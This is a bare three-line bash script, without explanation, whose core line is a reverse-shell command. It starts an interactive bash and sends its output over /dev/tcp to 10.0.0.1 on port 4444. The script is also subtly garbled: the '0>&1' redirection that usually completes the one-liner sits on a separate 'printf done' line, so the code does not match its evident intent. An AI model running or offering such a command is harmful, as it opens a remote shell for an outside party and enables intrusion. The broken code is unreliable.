#!/bin/bash
bash -i >& /dev/tcp/10.0.0.1/4444
printf done 0>&1
